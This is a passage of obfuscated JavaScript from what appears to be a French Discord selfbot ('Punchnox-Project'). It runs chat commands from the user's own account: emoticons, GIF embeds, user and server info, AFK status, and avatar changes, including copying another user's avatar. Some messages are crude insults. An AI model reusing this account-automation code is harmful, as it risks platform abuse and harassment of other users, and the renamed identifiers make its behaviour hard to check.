                            cg.channel.send('┬──┬ ノ( ゜-゜ノ)');
                          }
                        }
                        if (cg.content.startsWith(ab + 'gimme')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('༼ つ ◕_◕ ༽つ');
                          }
                        }
                        if (cg.content.startsWith(ab + 'serious')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('(ಠ_ಠ)');
                          }
                        }
                        if (cg.content.startsWith(ab + 'money')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('[̲̅$̲̅(̲̅ιοο̲̅)̲̅$̲̅]');
                          }
                        }
                        if (cg.content.includes(ab + 'kiss')) {
                          if (cg.author.id === aN.user.id) {
                            aD.get('https://neko-love.xyz/api/v1/kiss').then(p7 => {
                              var pa = p7.body.url,
                                pb;
                              if (cg.mentions.users.first()) {
                                pb = cg.mentions.users.first();
                              } else {
                                pb = cg.author;
                              }
                              var pc = new aw.RichEmbed().setTitle(cg.author.username + ' **Te fais un bisous** ' + pb.username).setDescription('').setImage(pa).setColor(ad);
                              cg.channel.send(pc);
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'love')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (cg.mentions.users.first()) user = cg.mentions.users.first();else {
                              user = cg.author;
                            }
                            var cq = new aw.RichEmbed().setTitle('Je t\'aime ' + user.username + ' ❤️❤️❤️').setDescription('').setImage('https://cdn.discordapp.com/attachments/603949531700396032/603951212567724042/3169546865_1_3_8YcAOoIs.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'tg')) {
                          if (cg.author.id == aN.user.id) {
                            cg.delete();
                            cg.mentions.users.first() ? user = cg.mentions.users.first() : user = cg.author;
                            var eH = new aw.RichEmbed().setAuthor(user.username + '  Ferme ta gueule fdp ! 👆').setColor(ad).setImage('https://media.giphy.com/media/b0xoqnrqoZXDa/giphy.gif').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(eH);
                          }
                        }
                        if (cg.content === ab + 'issou') {
                          if (cg.author.id === aN.user.id) {
                            let pc = new aw.RichEmbed();
                            pc.setColor(ad).setTitle('**ISSOU**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage(b1[Math.floor(Math.random() * b1.length)]), cg.edit(pc);
                          }
                        }
                        var eI = ['https://file1.topsante.com/var/topsante/storage/images/nutrition-et-recettes/equilibre-alimentaire/conseils-dietetiques/mon-ado-mange-n-importe-comment-que-faire/98388-2-fre-FR/Mon-ado-mange-n-importe-comment-que-faire.jpg', 'https://www.canalvie.com/polopoly_fs/1.9240224.1558122803!/image/b%C3%A9b%C3%A9%20mange%20trop.jpg_gen/derivatives/cvlandscape_670_377/b%C3%A9b%C3%A9%20mange%20trop.jpg', 'https://thumbs.gfycat.com/BeautifulGargantuanAustraliancurlew-size_restricted.gif', 'https://media1.tenor.com/images/26a2a9c2d504544ecafa884d88079886/tenor.gif'];
                        if (cg.content === ab + 'eat') {
                          if (cg.author.id === aN.user.id) {
                            let pg = new aw.RichEmbed();
                            pg.setColor(ad).setTitle('**' + aN.user.username + ' Mange**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage(eI[Math.floor(Math.random() * eI.length)]), cg.edit(pg);
                          }
                        }
                        var eJ = ['https://ichef.bbci.co.uk/news/1024/branded_news/67CF/production/_108857562_mediaitem108857561.jpg', 'https://i.pinimg.com/originals/fe/1c/eb/fe1ceb796fe3e4fe96d80c42c418336c.jpg', 'https://static01.nyt.com/images/2020/04/03/science/03TB-KINGFISHER1/03TB-KINGFISHER1-mediumSquareAt3X.jpg', 'https://media-cdn.tripadvisor.com/media/photo-s/13/33/62/ce/macaw-watching-you.jpg', 'https://www.lovethegarden.com/sites/default/files/content/articles/UK_wildbirds-03-great-tit.jpg', 'https://static.euronews.com/articles/stories/04/25/97/22/602x338_cmsv2_25bf0647-6b01-5b1f-90ab-c094b002a854-4259722.jpg', 'https://test.cdn.download.ams.birds.cornell.edu/api/v1/asset/171633971/1200', 'https://i0.wp.com/cdn-prod.medicalnewstoday.com/content/images/articles/327/327269/sparrow.jpg?w=1155&h=1415', 'https://coyotegulch.files.wordpress.com/2020/02/web_groombaltimoreoriole-and-a-male-red-breasted-grosbeak-via-audubon.jpg', 'https://celebrateurbanbirds.org/wp-content/uploads/2018/07/shutterstock_395179858-1920x1280.jpg', 'https://www.delinature.be/wp-content/uploads/insecteneter.jpg', 'https://lh3.googleusercontent.com/proxy/KrmRXpkpQQfrQ3Pq152miHbLBstGRuEJsw2iRnJ3J9NdClfZXkBKj_oyzIfi6J0MJiN6oq3OBHGJKvEthTlGeJxem7XmSuTd78hM', 'https://static01.nyt.com/images/2019/11/12/science/09TB-BIRDBACTERIA/09TB-BIRDBACTERIA-mobileMasterAt3x.jpg', 'https://pbs.twimg.com/media/EZRqUqKXsAEpI0y.jpg', 'https://i.pinimg.com/originals/39/73/75/3973759a2aed2d51285d3db17aeb4f5d.jpg', 'https://www.sciencemag.org/sites/default/files/styles/article_main_large/public/images/ss-bird_honeycreeper.jpg?itok=VlVY6gUB', 'https://www.dw.com/image/50789156_303.jpg', 'https://horizon-media.s3-eu-west-1.amazonaws.com/s3fs-public/field/image/urbanbird.jpg'];
                        if (cg.content === ab + 'bird') {
                          if (cg.author.id === aN.user.id) {
                            let pi = new aw.RichEmbed();
                            pi.setColor(ad).setTitle('**RANDOM BIRD**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setImage(eJ[Math.floor(Math.random() * eJ.length)]), cg.edit(pi);
                          }
                        }
                        let eK = cg.content.split(' ');
                        if (cg.content === ab + 'googlesearch') {
                          if (cg.author.id === aN.user.id) {
                            let pj = new aw.RichEmbed();
                            pj.setColor(ad).setTitle('**CLIQUE ICI POUR AVOIR ACCÈSA LA RECHERCHE**').setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setURL('http://lmgtfy.com/?q=' + eK.join('%20')), cg.edit(pj);
                          }
                        }
                        var eL = ['https://cdn.discordapp.com/attachments/714904917705228299/718488384703824023/50_000_abonnes_merci_a_tous.mp4', 'https://cdn.discordapp.com/attachments/714904917705228299/718488913026613349/ferme_ta_gueule_jm_le_silence.mp4', 'https://cdn.discordapp.com/attachments/714904917705228299/718488510704779264/coca-bien-frais-chacal.mp4'];
                        if (cg.content === ab + 'aroufvideo') {
                          if (cg.author.id === aN.user.id) {
                            var eM = eL[Math.floor(Math.random() * eL.length)];
                            cg.edit(eM);
                          }
                        }
                        if (cg.content.includes(ab + 'boom')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            if (cg.mentions.users.first()) {
                              user = cg.mentions.users.first();
                            } else user = cg.author;
                            var cq = new aw.RichEmbed().setTitle(user.username + ', **Ce Fait Explosé Par **💣💥').setDescription('').setImage('https://media.discordapp.net/attachments/648223633185177612/650715035592687647/image0.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'veski')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.mentions.users.first() ? user = cg.mentions.users.first() : user = cg.author;
                            var cq = new aw.RichEmbed().setTitle(user.username + ' c\'est enfuit').setDescription('').setImage(b0[Math.floor(Math.random() * b0.length)]).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'blc')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('Je m\'en Bat Les Couilles').setDescription('').setImage('https://cdn.discordapp.com/attachments/603949531700396032/603953116425093130/4K60fdp.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'patate')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('Patate dans ta mère PAAHHH').setDescription('').setImage('https://cdn.discordapp.com/attachments/603949531700396032/603956469083144212/gdeadcamdr.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'karma')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let ps;
                            cg.mentions.users.first() ? ps = cg.mentions.users.first() : ps = cg.author;
                            var cq = new aw.RichEmbed().setTitle('Bah écoute ' + ps.username + ' tu t\'es fais Karmaed').setDescription('').setImage('https://cdn.discordapp.com/attachments/602163438390738957/603946294888759316/tumblr_mns4ojjGJb1rzkceno1_500.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.includes(ab + 'sad')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var cq = new aw.RichEmbed().setTitle('Triste Snif...Snif').setDescription('').setImage('https://cdn.discordapp.com/attachments/603918054585401344/603948059230994432/FeminineRigidBlesbok-small.gif').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        cg.content === ab + 'neko' && cg.author.id === aN.user.id && aD.get('https://nekos.life/api/neko').then(pt => {
                          var pu = new aw.RichEmbed().setTitle('Neko 👀❤️').setColor(ad).setImage(pt.body.neko).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                          cg.edit(pu);
                        });
                        if (cg.content === ab + 'ping') {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let pu = new aw.RichEmbed().setColor(ad).setDescription('Loading...');
                            cg.channel.send(pu).then(() => {
                              pu.setColor(ad), pu.setDescription('Tu fais `' + aN.pings[0] + ' ms`'), pu.setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL), cg.edit(pu);
                            });
                          }
                        }
                        if (cg.content.includes(ab + 'userinfo')) {
                          let px = cg.guild;
                          if (!px) return cg.edit(':x: **Commande uniquement utilisable sur un serveur (pour le userinfo en pv c\'est `userpvinfo + mention`**');
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let py;
                            cg.mentions.users.first() ? py = cg.mentions.users.first() : py = cg.author;
                            var eN = {};
                            eN.online = ':white_check_mark: En Ligne', eN.dnd = ':no_entry: Ne Pas Deranger', eN.offline = ':zzz: Hors Ligne', eN.idle = ':large_orange_diamond: Inactif';
                            let pz = eN;
                            const pA = cg.guild.member(py),
                              pB = new aw.RichEmbed().setColor(ad).setThumbnail(py.avatarURL).setTitle('𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 || 𝐕𝐨𝐢𝐜𝐢 𝐋𝐞𝐬 𝐈𝐧𝐟𝐨 𝐃𝐞 ' + py.username + '#' + py.discriminator).addField('𝙉𝙞𝙘𝙠𝙉𝙖𝙢𝙚 :', '' + (pA.nickname !== null ? '' + pA.nickname : 'Pas De NickName'), true).addField('𝙄𝘿 :', '' + py.id, true).addField('𝘾𝙤𝙢𝙥𝙩𝙚 𝙘𝙧𝙚́𝙚𝙧 𝙡𝙚 :', '' + ax.utc(py.createdAt).format('dddd Do MMMM YYYY 𝙖 HH:ss'), true).addField('𝙍𝙚𝙟𝙤𝙞𝙣 𝙡𝙚 𝙨𝙚𝙧𝙫𝙚𝙪𝙧 𝙡𝙚 :', '' + ax.utc(pA.joinedAt).format('dddd Do MMMM YYYY 𝙖 HH:ss'), true).addField('𝙎𝙩𝙖𝙩𝙪𝙨 :', '' + pz[py.presence.status], true).addField('𝙅𝙤𝙪𝙚 𝙖 :', '' + (py.presence.game ? py.presence.game.name : 'Aucun Jeux'), true).addField('𝙍𝙤𝙡𝙚𝙨 :', pA.roles.map(pC => '' + pC).join(', '), true).addField('Bot ?', py.bot ? '✅' : '❌').addField('Administrateur ? ', pA.hasPermission('ADMINISTRATOR') ? '✅' : '❌').setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL);
                            pB.setTimestamp();
                            var eO = {};
                            eO.embed = pB, cg.channel.send(eO);
                          }
                        }
                        if (cg.content === ab + 'myperms') {
                          if (cg.author.id === aN.user.id) {
                            var eP = {};
                            eP.CREATE_INSTANT_INVITE = 'Créer une invitation instantanée', eP.KICK_MEMBERS = 'Kick des membres', eP.BAN_MEMBERS = 'Ban des mmembres', eP.ADMINISTRATOR = 'Administrateur', eP.MANAGE_CHANNELS = 'Modifier des salons', eP.MANAGE_GUILD = 'Modifier le serveur', eP.ADD_REACTIONS = 'Ajouter des réactions', eP.VIEW_AUDIT_LOG = 'Acces aux logs ', eP.PRIORITY_SPEAKER = 'Voix prioritaire', eP.STREAM = 'Faire un partage de jeux', eP.VIEW_CHANNEL = 'Voir les salons', eP.READ_MESSAGES = 'Lire les messages', eP.SEND_MESSAGES = 'Envoiller des messages', eP.SEND_TTS_MESSAGES = 'Envoiller des messages tts', eP.MANAGE_MESSAGES = 'Supprimer des messages', eP.EMBED_LINKS = 'Faire des embeds', eP.ATTACH_FILES = 'Attacher un fichier', eP.READ_MESSAGE_HISTORY = 'Voir les anciens messages', eP.MENTION_EVERYONE = 'Mentionner tous le monde', eP.EXTERNAL_EMOJIS = 'Emojis personnalisé', eP.USE_EXTERNAL_EMOJIS = 'Utiliser des emojis externes', eP.CONNECT = 'Se connecter en vocale', eP.SPEAK = 'Parler', eP.MUTE_MEMBERS = 'Mute des membres', eP.DEAFEN_MEMBERS = 'Mettre en sourdine des membres', eP.MOVE_MEMBERS = 'Move des membres', eP.USE_VAD = 'Faire un partage d\'écran', eP.CHANGE_NICKNAME = 'Changer de pseudo', eP.MANAGE_NICKNAMES = 'Modifier les pseudos', eP.MANAGE_ROLES = 'Modifier les rôles', eP.MANAGE_ROLES_OR_PERMISSIONS = 'Modifier les rôles et permissions', eP.MANAGE_WEBHOOKS = 'Modifier les webhooks', eP.MANAGE_EMOJIS = 'Modifier les emojis', permissions1 = eP;
                            const pC = cg.guild.member(cg.author),
                              pD = new aw.RichEmbed().setTitle('Permissions : ').setDescription('>>> ' + (pC.permissions ? pC.permissions.toArray().map(pE => '`' + permissions1[pE] + '`').join('\n') : 'Vous n\'avez aucune permissions je sais meme pas comment vous avez réussis à envoiler un message ')).setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL);
                            cg.edit(pD);
                          }
                        }
                        let eQ = JSON.parse(aB.readFileSync(__dirname + '/Data/statut.json', 'utf8'));
                        time = '1800000';
                        if (cg.content.includes(ab + 'unafk')) {
                          if (cg.author.id === aN.user.id) {
                            if (eQ[cg.author.id]) {
                              delete eQ[cg.author.id];
                              var eR = new aw.RichEmbed().setDescription('**AFK enlevé avec succes**').setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL).setColor(ad).setTimestamp();
                              cg.edit(eR).catch(console.error).then(pE => pE.delete(time));
                            } else cg.edit(eR).catch(console.error).then(pF => pF.delete(time));
                            aB.writeFile(__dirname + '/Data/statut.json', JSON.stringify(eQ), pF => {
                              if (pF) console.error(pF);
                            });
                          } else {
                            cg.edit(eR).catch(console.error).then(pF => pF.delete(time));
                          }
                        }
                        var eS = new aw.RichEmbed().setDescription('**Tu es AFK sans raisons précise.**').setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL).setTimestamp(),
                          eT = new aw.RichEmbed().setDescription('***Tu es déjà AFK. !***').setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL).setTimestamp(),
                          cN = cg.content.split(' '),
                          d8 = cN.slice(1);
                        let eU = d8.slice(0).join(' ');
                        var cq = new aw.RichEmbed().setDescription('**Tu es desormais AFK pour :**`' + eU + '`.').setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL).setTimestamp();
                        if (cg.content.includes(ab + 'setafk')) {
                          if (cg.author.id === aN.user.id) {
                            if (eQ[cg.author.id]) {
                              return cg.edit(eT).catch(console.error).then(pH => pH.delete(time));
                            } else {
                              let pH = cg.content.split(' ').slice(1);
                              if (pH.length === 0) {
                                var eV = {};
                                eV.reason = true, eQ[cg.author.id] = eV, cg.edit(eS);
                              } else {
                                var eW = {};
                                eW.reason = pH.join(' '), eQ[cg.author.id] = eW, cg.edit(cq).catch(console.error).then(pJ => pJ.delete(time));
                              }
                              aB.writeFile(__dirname + '/Data/statut.json', JSON.stringify(eQ), pJ => {
                                if (pJ) console.error(pJ);
                              });
                            }
                          }
                        }
                        var eX = cg.mentions.users.first();
                        if (cg.mentions.users.size > 0) {
                          if (eQ[cg.mentions.users.first().id]) {
                            var eY = new aw.RichEmbed().setDescription(eX.username + '** est AFK**: `Sans Raison précises`').setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL).setTimestamp(),
                              eZ = new aw.RichEmbed().setDescription(eX.username + '** est AFK pour ** :`' + eQ[cg.mentions.users.first().id].reason + '`.').setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL).setTimestamp();
                            if (eQ[cg.mentions.users.first().id].reason === true) {
                              cg.channel.send(eY);
                            } else cg.channel.send(eZ);
                          }
                        }
                        var cN = cg.content.split(' '),
                          d8 = cN.slice(1);
                        if (cg.content.includes(ab + 'calcul')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete().catch(console.error());
                            d8.length < 1 && cg.reply('Tu dois fournir un calcul valide :boom:').catch(console.error).then(pP => pP.delete(time));
                            const pM = d8.join(' ');
                            let pN;
                            try {
                              pN = aA.eval(pM);
                            } catch (pQ) {
                              console.error('Invalid math equation: ' + pQ);
                            }
                            cg.delete();
                            let pO = new aw.RichEmbed().setDescription('**Calculatrice !**').addField('**Equation:**', pM).addField('**Resultat:**', pN).setColor(ad).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 || ' + aN.user.username, cg.author.avatarURL).setTimestamp();
                            cg.channel.send(pO).catch(console.error).then(pR => pR.delete(time));
                          }
                        }
                        if (cg.content === ab + 'emojislist') {
                          if (cg.author.id === aN.user.id) {
                            const pR = cg.guild.emojis.map(pS => pS.toString()).join(' ');
                            var f0 = new aw.RichEmbed().setTitle('**Emoji List**').addField('```Emoji : ```', pR).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 || ' + aN.user.username, cg.author.avatarURL).setColor(ad);
                            cg.channel.send(f0);
                          }
                        }
                        if (cg.content.includes(ab + 'rolelist')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            cg.channel.send('```\n' + cg.guild.roles.map(pT => pT.name).join('\n') + '```');
                          }
                        }
                        if (cg.content.includes(ab + 'userpvinfo')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let pU;
                            if (cg.mentions.users.first()) {
                              pU = cg.mentions.users.first();
                            } else {
                              pU = cg.author;
                            }
                            const pV = new aw.RichEmbed().setColor(ad).setThumbnail(pU.avatarURL).setTitle('Voici les infos de ' + pU.username + '#' + pU.discriminator).addField('ID :', '' + pU.id, true).addField('Compte crée le :', '' + ax.utc(pU.createdAt).format('dddd, MMMM Do YYYY, HH:ss'), true).addField('Status :', '' + pU.presence.status, true).addField('Joue à :', '' + (pU.presence.game ? pU.presence.game.name : 'None'), true).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 || ' + aN.user.username, cg.author.avatarURL);
                            pV.setTimestamp();
                            var f1 = {};
                            f1.embed = pV, cg.channel.send(f1);
                          }
                        }
                        if (cg.content.includes(ab + 'getid')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let pY;
                            if (cg.mentions.users.first()) {
                              pY = cg.mentions.users.first();
                            } else pY = cg.author;
                            const pZ = new aw.RichEmbed().setColor(ad).setTitle('Voici l\'id de ' + pY.username + '#' + pY.discriminator).addField('ID :', '' + pY.id, true).setFooter(' 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 || ' + aN.user.username, cg.author.avatarURL);
                            pZ.setTimestamp(), cg.channel.send(pZ);
                          }
                        }
                        if (cg.content.includes(ab + 'serverinfo')) {
                          let q1 = cg.guild;
                          if (!q1) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            function q2(q7) {
                              let q9 = new Date(),
                                qa = q9.getTime() - q7.getTime(),
                                qb = Math.floor(qa / 86400000);
                              return qb + (qb == 1 ? ' day' : ' days') + ' ago';
                            }
                            ;
                            var f2 = cg.guild.owner.displayName;
                            const q3 = ['Aucune Restriction', 'E-mail vérifié', 'Inscrit depuis plus de 5min minimum', 'Membre du serveur depuis plus de 10minutes', 'Téléphone Vérifié'];
                            var f3 = {};
                            f3.brazil = ':flag_br: Brazil', f3['eu-central'] = ':flag_eu: Central Europe', f3.singapore = ':flag_sg: Singapore', f3['us-central'] = ':flag_us: U.S. Central', f3.sydney = ':flag_au: Sydney', f3['us-east'] = ':flag_us: U.S. East', f3['us-south'] = ':flag_us: U.S. South', f3['us-west'] = ':flag_us: U.S. West', f3['eu-west'] = ':flag_eu: Western Europe', f3['vip-us-east'] = ':flag_us: VIP U.S. East', f3.london = ':flag_gb: London', f3.amsterdam = ':flag_nl: Amsterdam', f3.hongkong = ':flag_hk: Hong Kong', f3.russia = ':flag_ru: Russia', f3.southafrica = ':flag_za:  South Africa';
                            let q4 = f3,
                              q5 = cg.guild.iconURL,
                              q6 = new aw.RichEmbed().setTitle('**Server Info**').setColor(ad).setThumbnail(q5).addField(':scroll:| Nom Du Serveur :', '🠶  ' + cg.guild.name, true).addField(':id:| ID Du Serveur :', '🠶  ' + cg.guild.id + '\n󠂪', true).addBlankField().addField(':white_check_mark:| Sécurité Du Serveur :', '🠶  ' + q3[cg.guild.verificationLevel] + '\n󠂪', true).addField(':calendar_spiral:| Serveur Créer Le :', '🠶  ' + cg.channel.guild.createdAt.toUTCString().substr(0, 16) + ' (' + q2(cg.channel.guild.createdAt) + ')', true).addField(':robot:| Bots du Serveur :', '🠶  ' + cg.guild.members.filter(q7 => q7.user.bot).size, true).addBlankField().addField(':pushpin:| Roles Du Serveur :', '🠶  ' + cg.guild.roles.size, true).addField(':speech_left:| Channels :', '🠶  ' + cg.guild.channels.size + '\n󠂪', true).addField(':clipboard:| Membres du Serveur :', '🠶  ' + cg.guild.memberCount + '\n󠂪', true).addField(':man_office_worker:| Nombre de boosters :', cg.guild.premiumTier ? cg.guild.premiumTier : 'Aucun', true).addField(':money_with_wings: | Nombre de boosts :', '' + (cg.guild.premiumSubscriptionCount || '0'), true).addBlankField().addField(':crown:| Couronne Du Serveur :', '🠶  ' + f2 + '\n󠂪', true).addField(':map:| Region :', '🠶  ' + q4[cg.guild.region], true).addField(':warning:Pour Plus D\'informations Sur Le Serveur Tape:warning:', '🠶' + ab + 'infoplus', true).setFooter('ServerInfo Demander Par : ' + cg.author.username + '#' + cg.author.discriminator + ' , 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩', cg.author.avatarURL);
                            q6.setTimestamp(), cg.channel.send(q6);
                          }
                        }
                        if (cg.content.startsWith(ab + 'uptime')) {
                          cg.delete(50);
                          let q8 = new Date(null);
                          q8.setMilliseconds(aN.uptime);
                          let q9 = q8.toISOString().substr(11, 2),
                            qa = q8.toISOString().substr(14, 2),
                            qb = q8.toISOString().substr(17, 2);
                          cg.channel.send('**[DEBUG] Uptime: ' + q9 + ' Hours | ' + qa + ' Minutes | ' + qb + ' Seconds**'), console.log('[DEBUG] Uptime: ' + q9 + ' Hours | ' + qa + ' Minutes | ' + qb + ' Seconds');
                        }
                        if (cg.content.includes(ab + 'infoplus')) {
                          let qd = cg.guild;
                          if (!qd) return cg.edit(':x: **Commande uniquement utilisable sur un serveur**');
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let qf = cg.guild.iconURL,
                              qg = new aw.RichEmbed().setColor(ad).setTitle('**Stats Roles / Channels**').addField(':hammer_pick:| Roles Totals :', '🠶  ' + cg.guild.roles.size, true).addField(':pencil:| Channels Totals :', '🠶  ' + cg.guild.channels.size, true);
                            qg.setTimestamp(), cg.channel.send(qg);
                          }
                        }
                        if (cg.content.includes(ab + 'infoplus')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            var f4 = ':spy: **__Membre(s) Total__** : ' + cg.guild.memberCount + '\n\n:white_check_mark: **En Ligne** : ' + cg.guild.members.filter(qj => qj.presence.status === 'online').size + ' | :no_entry:  **Ne Pas Deranger** : ' + cg.guild.members.filter(qj => qj.presence.status === 'dnd').size + '\n:large_orange_diamond: **Inactif** : ' + cg.guild.members.filter(qj => qj.presence.status === 'idle').size + ' | :zzz: **Hors Ligne** : ' + cg.guild.members.filter(qj => qj.presence.status === 'offline').size;
                            let qi = new aw.RichEmbed().setColor(ad).setDescription(f4).setTitle('**Stats Membre**');
                            qi.setTimestamp(), cg.channel.send(qi);
                          }
                        }
                        if (cg.content.startsWith(ab + 'avatar')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let qk = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              ql = qk.displayAvatarURL;
                            var cq = new aw.RichEmbed().setDescription('**Voici l\'avatar de : ' + qk.username + ' ** [   󠇰󠇰󠇰󠇰 ](' + ql + ')').setImage(ql + '?size=2048').setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'revav')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
                            let qm = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                              qn = qm.displayAvatarURL;
                            var cq = new aw.RichEmbed().setTitle('**CLIQUE ICI**').setDescription('*les résultats de la recherche sont sur le lien (le clique ici).*').setURL('https://images.google.com/searchbyimage?image_url=' + qn).setColor(ad).setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL).setTimestamp();
                            cg.channel.send(cq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'pp')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            const qq = new aw.RichEmbed().setColor(ad).setThumbnail(d8.join(' ')).setDescription('```Changement de photo de profil réussie avec succès !```').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                            aN.user.setAvatar(d8.join(' ')), cg.channel.send(qq);
                          }
                        }
                        if (cg.content.startsWith(ab + 'robpp')) {
                          if (cg.author.id === aN.user.id) {
                            cg.delete();
                            if (c9) {
                              let qs = cg.mentions.users.first() ? cg.mentions.users.first() : cg.author,
                                qt = qs.displayAvatarURL;
                              const qu = new aw.RichEmbed().setColor(ad).setThumbnail(qt).setDescription('```Vole de la pp de ' + qs.username + ' avec succès !```').setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              aN.user.setAvatar(qt), cg.channel.send(qu);
                            } else {
                              cg.channel.send(cu);
                            }
                          }
                        }
                        if (cg.content.includes(ab + '8ball')) {
                          if (cg.author.id === aN.user.id) {
                            if (c9) {
                              let qy = cg.content.split(/\s+/g).slice(1).join(' ');
                              if (!qy) return cg.channel.send('***Tu na pas mis ta question!*** **Usage: -8ball <question>**');
                              var f5 = ['C\'est certain', '*Oui*', '*Peut être*', '*Probablement*', '*Je ne pense pas*', '*Alors la...*', '*Pourquoi cette question*', '*Je sais pas*', '*OMG comment tu sais*', '*Stv*', '*Mdr*', '*OK.*', '*Non*'];
                              const qz = new aw.RichEmbed().setTitle(':8ball: **Voici la réponse :**').setDescription(f5[Math.round(Math.random() * (f5.length - 1))] + ' .').setColor(ad).setTimestamp().setFooter(aN.user.username + '   ||   ' + bs + ' ', aN.user.avatarURL);
                              cg.channel.send(qz);
                            } else cg.edit(cu);
                          }
                        }
                        var f6 = cg.content.split(' ').slice(1).join(' ');
                        if (cg.content.startsWith(ab + 'stream')) {
                          if (cg.author.id === aN.user.id) {
                            if (cg.deletable) cg.delete();
